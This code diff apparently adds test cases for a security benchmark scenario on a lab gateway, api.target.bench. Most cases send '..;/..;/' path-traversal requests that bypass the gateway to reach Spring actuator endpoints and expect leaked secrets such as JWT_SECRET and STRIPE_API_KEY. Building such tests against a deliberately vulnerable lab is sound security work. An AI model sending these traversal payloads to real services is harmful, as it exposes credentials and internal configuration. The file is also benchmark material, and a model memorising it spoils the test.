@@ -858,6 +858,120 @@ def _build_test_cases(base_url: str, priv_url: str | None = None) -> list[VulnTe
         severity="medium",
     ))
 
+    # ═══════════════════════════════════════════════════════════════
+    # S17: microservice_path_normalization_bypass
+    # api.target.bench — 同域名微服务路由 + ..;/..;/ 路径规范化差异绕过
+    # ═══════════════════════════════════════════════════════════════
+
+    cases.append(VulnTestCase(
+        id="PN_TRAVERSAL_USER_ENV", name="..;/..;/ traversal to user-service actuator/env",
+        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
+        method="GET", path="/api/users/..;/..;/actuator/env", host="api.target.bench",
+        expected_flags=["user_service_app", "Us3rS3rv1ce", "JWT_SECRET"],
+        expected_status=200, severity="critical",
+    ))
+
+    cases.append(VulnTestCase(
+        id="PN_TRAVERSAL_ORDER_ENV", name="..;/..;/ traversal to order-service actuator/env",
+        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
+        method="GET", path="/api/orders/..;/..;/actuator/env", host="api.target.bench",
+        expected_flags=["order_service_app", "0rd3rS3rv1ce", "MQ_URL"],
+        expected_status=200, severity="critical",
+    ))
+
+    cases.append(VulnTestCase(
+        id="PN_TRAVERSAL_PAYMENT_ENV", name="..;/..;/ traversal to payment-service actuator/env",
+        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
+        method="GET", path="/api/payments/..;/..;/actuator/env", host="api.target.bench",
+        expected_flags=["payment_service_app", "sk_live", "STRIPE_API_KEY"],
+        expected_status=200, severity="critical",
+    ))
+
+    cases.append(VulnTestCase(
+        id="PN_TRAVERSAL_USER_MAPPINGS", name="..;/..;/ traversal to user-service actuator/mappings",
+        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
+        method="GET", path="/api/users/..;/..;/actuator/mappings", host="api.target.bench",
+        expected_flags=["UserController"],
+        expected_status=200, severity="high",
+    ))
+
+    cases.append(VulnTestCase(
+        id="PN_TRAVERSAL_ORDER_MAPPINGS", name="..;/..;/ traversal to order-service actuator/mappings",
+        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
+        method="GET", path="/api/orders/..;/..;/actuator/mappings", host="api.target.bench",
+        expected_flags=["OrderController"],
+        expected_status=200, severity="high",
+    ))
+
+    cases.append(VulnTestCase(
+        id="PN_TRAVERSAL_PAYMENT_MAPPINGS", name="..;/..;/ traversal to payment-service actuator/mappings",
+        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
+        method="GET", path="/api/payments/..;/..;/actuator/mappings", host="api.target.bench",
+        expected_flags=["PaymentController"],
+        expected_status=200, severity="high",
+    ))
+
+    cases.append(VulnTestCase(
+        id="PN_ACTUATOR_DIRECT_BLOCKED", name="Direct actuator/env blocked by gateway",
+        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
+        method="GET", path="/actuator/env", host="api.target.bench",
+        expected_status=403, severity="medium",
+    ))
+
+    cases.append(VulnTestCase(
+        id="PN_ACTUATOR_HEALTH_DIRECT_BLOCKED", name="Direct actuator/health blocked by gateway",
+        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
+        method="GET", path="/actuator/health", host="api.target.bench",
+        expected_status=403, severity="medium",
+    ))
+
+    cases.append(VulnTestCase(
+        id="PN_TRAVERSAL_USER_HEALTH", name="..;/..;/ traversal to user-service actuator/health",
+        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
+        method="GET", path="/api/users/..;/..;/actuator/health", host="api.target.bench",
+        expected_flags=["UP"],
+        expected_status=200, severity="medium",
+    ))
+
+    cases.append(VulnTestCase(
+        id="PN_URL_ENCODED_TRAVERSAL", name="URL-encoded ..%2f..%2f blocked by nginx actuator block",
+        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
+        method="GET", path="/api/users/..%2f..%2f/actuator/env", host="api.target.bench",
+        expected_status=403, severity="medium",
+    ))
+
+    cases.append(VulnTestCase(
+        id="PN_TRAVERSAL_USER_CONFIGPROPS", name="..;/..;/ traversal to user-service actuator/configprops",
+        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
+        method="GET", path="/api/users/..;/..;/actuator/configprops", host="api.target.bench",
+        expected_flags=["management.endpoints"],
+        expected_status=200, severity="high",
+    ))
+
+    cases.append(VulnTestCase(
+        id="PN_TRAVERSAL_USER_BEANS", name="..;/..;/ traversal to user-service actuator/beans",
+        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
+        method="GET", path="/api/users/..;/..;/actuator/beans", host="api.target.bench",
+        expected_flags=["UserController"],
+        expected_status=200, severity="medium",
+    ))
+
+    cases.append(VulnTestCase(
+        id="PN_NORMAL_API_USERS", name="S17 service alive via traversal to actuator/env",
+        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
+        method="GET", path="/api/users/..;/..;/actuator/env", host="api.target.bench",
+        expected_flags=["user_service_app"],
+        expected_status=200, severity="low",
+    ))
+
+    cases.append(VulnTestCase(
+        id="PN_USER_ACTUATOR_DISCOVERY", name="..;/..;/ traversal to user-service actuator discovery",
+        scenario_id="S17", scenario_name="microservice_path_normalization_bypass",
+        method="GET", path="/api/users/..;/..;/actuator", host="api.target.bench",
+        expected_flags=["_links"],
+        expected_status=200, severity="high",
+    ))
+
     # v5.0: Auto-route priv-gateway subdomains (admin/api/internal) to priv_url
     # Pub-gateway returns 444 for these Host headers; must use priv-gateway instead
     PRIV_GATEWAY_HOSTS = {"admin.target.bench", "api.target.bench", "internal.target.bench"}
